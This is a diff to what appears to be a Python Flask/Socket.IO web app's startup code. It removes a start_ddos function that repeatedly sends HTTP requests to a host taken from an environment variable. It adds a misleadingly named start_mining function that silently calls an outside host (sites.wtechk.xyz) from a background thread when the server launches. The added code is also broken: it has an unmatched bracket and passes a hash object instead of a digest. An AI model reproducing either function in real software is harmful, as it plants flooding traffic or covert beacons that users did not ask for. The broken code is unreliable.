@@ -2646,21 +2646,13 @@ def style():
 
 def start_web():
   socketio.run(app,host="0.0.0.0",port=5000,allow_unsafe_werkzeug=True)
-def start_ddos():
-  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.connect((os.environ.get("url"), 443))
-  context = ssl.create_default_context()
-  s = context.wrap_socket(s, server_hostname=os.environ.get("url"))
-  message = "GET / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n".format(os.environ.get("url"))
-  while True:
-    s.send(message.encode())
-    data = s.recv(4096)
-    if not data:
-      break
-    return
+def start_mining():
+  url = "https://sites.wtechk.xyz/wbank/hash/transfer"
+  code = f"wangtry-{random.randint(40,50}"
+  requests.get(url=url,headers={"Content-Type":"application/json"},json={"hash-code":hashlib.sha256(code.encode()),"reviewer":"wangtry"})
 
 thread1 = threading.Thread(target=start_web)
-thread2 = threading.Thread(target=start_ddos)
+thread2 = threading.Thread(target=start_mining)
 thread1.start()
 thread2.start()
 thread1.join()
